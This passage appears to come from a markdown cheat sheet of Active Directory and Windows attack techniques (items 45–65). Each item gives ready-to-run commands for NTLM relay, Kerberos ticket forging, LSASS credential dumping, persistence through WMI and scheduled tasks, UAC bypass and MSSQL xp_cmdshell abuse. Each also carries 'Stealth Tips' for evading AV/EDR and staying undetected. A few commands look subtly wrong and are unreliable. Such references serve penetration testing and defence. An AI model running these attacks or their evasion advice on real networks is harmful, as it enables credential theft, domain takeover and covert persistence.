```bash
python3 petitpotam.py attacker-ip target-ip
ntlmrelayx.py -t http://CA-server/certsrv/ --adcs
```
- **Tools**: petitpotam, ntlmrelayx  
- **Stealth Tips**: Coerce once; use high-integrity cert template  
</details>

<a name="delegation-abuse-unconstrained"></a>
<details>
  <summary><strong>46. Delegation Abuse - Unconstrained</strong></summary>

- **Purpose**: Abuse unconstrained delegation to impersonate users  
- **Functionality**: Attacker machine gets TGTs when user logs in  
- **Why It's Vulnerable**: Unconstrained delegation set on computer object  
- **How to Test**: Trick user into authenticating to attacker-controlled host  
```powershell
# After victim auths
Rubeus tgtdeleg
```
- **Tools**: Rubeus, Mimikatz  
- **Stealth Tips**: Limit use of captured TGTs; cleanup afterwards  
</details>

<a name="kerberos-rc4-hashing-deprecated-vuln"></a>
<details>
  <summary><strong>47. Kerberos RC4 Hashing (Weak Crypto)</strong></summary>

- **Purpose**: Exploit weak encryption for ticket forging  
- **Functionality**: Use known hash to forge TGT/TGS  
- **Why It's Vulnerable**: Legacy support of RC4 and weak crypto algorithms  
- **How to Test**: Force RC4 with Rubeus and inject forged tickets  
```powershell
Rubeus asktgt /user:target /rc4:<ntlm> /ptt
```
- **Tools**: Rubeus  
- **Stealth Tips**: Avoid triggering Kerberos events  
</details>

<a name="kerberos-golden-ticket"></a>
<details>
  <summary><strong>48. Golden Ticket</strong></summary>

- **Purpose**: Forge TGTs as any user including domain admins  
- **Functionality**: Use krbtgt hash to craft TGT  
- **Why It's Vulnerable**: DC trusts TGTs signed by krbtgt  
- **How to Test**: Dump krbtgt hash and create TGT  
```powershell
mimikatz "kerberos::ptt golden.kirbi"
```
- **Tools**: Mimikatz  
- **Stealth Tips**: Use short lifetime TGTs; avoid excessive privileges  
</details>

<a name="ldap-signing-bypass"></a>
<details>
  <summary><strong>49. LDAP Signing Not Enforced</strong></summary>

- **Purpose**: Relay NTLM to LDAP without signing  
- **Functionality**: AD doesn’t require LDAP signing by default  
- **Why It's Vulnerable**: Enables relaying to domain controller  
- **How to Test**: Relay NTLM to LDAP using ntlmrelayx  
```bash
ntlmrelayx.py -t ldap://dc-ip --escalate-user victim
```
- **Tools**: ntlmrelayx, Responder  
- **Stealth Tips**: Limit relays; delete accounts created  
</details>

<a name="overpass-the-hash-pass-the-key"></a>
<details>
  <summary><strong>50. OverPass-the-Hash (Pass-the-Key)</strong></summary>

- **Purpose**: Authenticate using NTLM hash by forging TGT  
- **Functionality**: Use AES/RC4 hash to generate TGT  
- **Why It's Vulnerable**: Kerberos accepts keys instead of passwords  
- **How to Test**: Use Mimikatz or Rubeus to craft TGT  
```powershell
mimikatz "kerberos::ptt /user:user /domain:lab.local /rc4:<ntlm>"
```
- **Tools**: Mimikatz, Rubeus  
- **Stealth Tips**: Clean up injected tickets  
</details>


<a name="resource-based-constrained-delegation"></a>
<details>
  <summary><strong>51. Resource-Based Constrained Delegation (RBCD)</strong></summary>

- **Purpose**: Allow impersonation on target by modifying msDS-AllowedToActOnBehalfOfOtherIdentity  
- **Functionality**: Attacker-controlled computer account is delegated on victim  
- **Why It's Vulnerable**: ACL misconfig or writable attributes allow delegation abuse  
- **How to Test**:
```powershell
Add-DComputer -ComputerName 'pwned' -SAMAccountName 'pwned$'
Set-ADComputer 'victim$' -PrincipalsAllowedToDelegateToAccount 'pwned$'
```
- **Tools**: PowerView, Rubeus, Impacket  
- **Stealth Tips**: Use stealthy names; revert delegation post-access  
</details>

<a name="unquoted-service-path"></a>
<details>
  <summary><strong>52. Unquoted Service Path</strong></summary>

- **Purpose**: Exploit path parsing to run malicious binary with service privileges  
- **Functionality**: Windows may misinterpret unquoted service paths with spaces  
- **Why It's Vulnerable**: Service binary path is not wrapped in quotes  
- **How to Test**:
```powershell
sc qc vulnservice
# Place binary at 'C:\Program Files\Some App\evil.exe'
```
- **Tools**: PowerUp, accesschk.exe  
- **Stealth Tips**: Clean up binary; requires service restart  
</details>

<a name="weak-service-permissions"></a>
<details>
  <summary><strong>53. Weak Service Permissions</strong></summary>

- **Purpose**: Modify service binary to execute attacker code  
- **Functionality**: Service permissions allow write/replace of executable  
- **Why It's Vulnerable**: Misconfigured DACLs on service or executable  
- **How to Test**:
```powershell
accesschk.exe -uwcqv "Authenticated Users" * /svc
sc config vulnservice binpath= "C:\evil.exe"
```
- **Tools**: PowerUp, accesschk, sc.exe  
- **Stealth Tips**: Revert path after execution  
</details>

<a name="mimikatz-sekurlsa-dump"></a>
<details>
  <summary><strong>54. Credential Dumping with Mimikatz</strong></summary>

- **Purpose**: Extract plaintext passwords, hashes, and tickets from LSASS  
- **Functionality**: LSASS memory stores creds of logged-in users  
- **Why It's Vulnerable**: LSASS is accessible to admin-level users  
- **How to Test**:
```powershell
mimikatz
privilege::debug
sekurlsa::logonpasswords
```
- **Tools**: Mimikatz  
- **Stealth Tips**: Avoid AV/EDR detection; use memory-safe methods  
</details>

<a name="browser-creds-and-lsass"></a>
<details>
  <summary><strong>55. Dumping Browser Creds & LSASS Offline</strong></summary>

- **Purpose**: Steal saved browser passwords or LSASS dump for offline parsing  
- **Functionality**: Use tools to decrypt browser or parse minidumps  
- **Why It's Vulnerable**: Browsers and LSASS often store sensitive data  
- **How to Test**:
```bash
procdump64.exe -ma lsass.exe lsass.dmp
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```
- **Tools**: Mimikatz, procdump, LaZagne  
- **Stealth Tips**: Upload & analyze offline; clean up dumps  
</details>

<a name="wmi-persistence"></a>
<details>
  <summary><strong>56. WMI Event Subscription Persistence</strong></summary>

- **Purpose**: Maintain access using permanent WMI events  
- **Functionality**: Register event filters and consumers to execute payload  
- **Why It's Vulnerable**: WMI can persist actions without files  
- **How to Test**:
```powershell
Invoke-WmiEvent -Trigger Win32ProcessStartTrace -Command "calc.exe"
```
- **Tools**: PowerShell, WMIExplorer  
- **Stealth Tips**: Hard to detect; clear subscriptions later  
</details>

<a name="scheduled-task-persistence"></a>
<details>
  <summary><strong>57. Scheduled Task Persistence</strong></summary>

- **Purpose**: Run payload at logon or system boot  
- **Functionality**: Task Scheduler executes attacker-defined task  
- **Why It's Vulnerable**: Misconfigured permissions or admin access  
- **How to Test**:
```powershell
schtasks /create /tn "Updater" /tr "C:\evil.exe" /sc onlogon /ru System
```
- **Tools**: schtasks, PowerSploit  
- **Stealth Tips**: Use legit-looking names and paths  
</details>

<a name="user-account-control-bypass"></a>
<details>
  <summary><strong>58. UAC Bypass</strong></summary>

- **Purpose**: Elevate from medium integrity to high integrity without prompt  
- **Functionality**: Abuse auto-elevated binaries  
- **Why It's Vulnerable**: Auto-elevate rules and DLL hijacking  
- **How to Test**:
```powershell
Invoke-BinaryUACBypass -Method fodhelper -Command "C:\evil.exe"
```
- **Tools**: UACME, PowerUp  
- **Stealth Tips**: Use signed binaries if possible  
</details>

<a name="shadow-credentials"></a>
<details>
  <summary><strong>59. Shadow Credentials</strong></summary>

- **Purpose**: Persist access via alternate credentials (KeyCredential)  
- **Functionality**: Add attacker public key to victim user object  
- **Why It's Vulnerable**: Weak ACLs allow key injection  
- **How to Test**:
```bash
certify shadow /user:target /dc:dc-ip /machine:attacker
```
- **Tools**: Certify, Whisker, SharpHound  
- **Stealth Tips**: Silent persistence method  
</details>

<a name="adcs-template-misconfig"></a>
<details>
  <summary><strong>60. ADCS Certificate Template Misconfig</strong></summary>

- **Purpose**: Abuse vulnerable certificate templates to escalate  
- **Functionality**: Enroll in low-privilege templates with high privilege rights  
- **Why It's Vulnerable**: Wrong security descriptors on templates  
- **How to Test**:
```bash
certify find /vulnerable
certify request /template:User /altname:admin
```
- **Tools**: Certify, ADCSKit  
- **Stealth Tips**: Remove certs after use  
</details>

<a name="printerbug-coercion"></a>
<details>
  <summary><strong>61. PrinterBug Coercion</strong></summary>

- **Purpose**: Coerce machine to authenticate to attacker  
- **Functionality**: Send Print Spooler call that triggers SMB auth  
- **Why It's Vulnerable**: Printer bug causes machine auth leak  
- **How to Test**:
```bash
rpcdump.py @target -U user
printerbug.py attacker@domain target
```
- **Tools**: printerbug.py, Responder  
- **Stealth Tips**: Use once per target; rotate SMB listener  
</details>

<a name="priv-esc-across-trust-key-abuse"></a>
<details>
  <summary><strong>62. PrivEsc across External Trust – Trust Key Abuse</strong></summary>

- **Purpose**: Exploit trust misconfig to access another domain  
- **Functionality**: Abuse shared trust keys to forge cross-domain tickets  
- **Why It's Vulnerable**: Poor trust config allows forging with known keys  
- **How to Test**:
```powershell
Rubeus tgtdeleg /rc4:<trustkey> /domain:child.domain
```
- **Tools**: Rubeus, Mimikatz  
- **Stealth Tips**: Minimal noise across domains; cleanup tickets  
</details>

<a name="kerberos-key-listing-dumping"></a>
<details>
  <summary><strong>63. Kerberos Key Listing/Dumping</strong></summary>

- **Purpose**: Extract Kerberos keys from memory or dump  
- **Functionality**: Keys used for ticket encryption are dumped from LSASS  
- **Why It's Vulnerable**: Keys reside in memory  
- **How to Test**:
```powershell
mimikatz "sekurlsa::ekeys"
```
- **Tools**: Mimikatz  
- **Stealth Tips**: Avoid AV detection; use offline analysis  
</details>

<a name="kerberos-renewable-ticket-abuse"></a>
<details>
  <summary><strong>64. Renewable Kerberos Ticket Abuse</strong></summary>

- **Purpose**: Persist access by renewing TGT indefinitely  
- **Functionality**: Create long-lifetime ticket and keep renewing  
- **Why It's Vulnerable**: Policy allows long ticket lifetimes  
- **How to Test**:
```powershell
Rubeus renew /ticket:<kirbi>
```
- **Tools**: Rubeus  
- **Stealth Tips**: Fly under radar with long-term access  
</details>

<a name="trust-abuse-mssql"></a>
<details>
  <summary><strong>65. Trust Abuse - MSSQL Servers</strong></summary>

- ✅ <strong>Purpose</strong>: Lateral movement or privilege escalation using trusted MSSQL links  
- ✅ <strong>Functionality</strong>: MSSQL servers can be linked via <code>sp_addlinkedserver</code>, allowing commands to be run remotely  
- ✅ <strong>Why It's Vulnerable</strong>: Poorly secured links, weak permissions, or trust misconfigurations can be abused  
- ✅ <strong>How to Test</strong>: Attempt to enumerate or create linked servers and run remote commands via <code>xp_cmdshell</code>  
- ✅ <strong>Tools</strong>: <code>mssqlclient.py</code>, <code>PowerUpSQL</code>, <code>sqsh</code>, <code>sqlcmd</code>  
- ✅ <strong>Stealth Tips</strong>: Use SQL commands to stay within DB context; avoid noisy OS-level interactions  

<pre><code class="language-sql">
-- Enable xp_cmdshell if allowed
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Exploit linked server
EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name];
</code></pre>

</details>
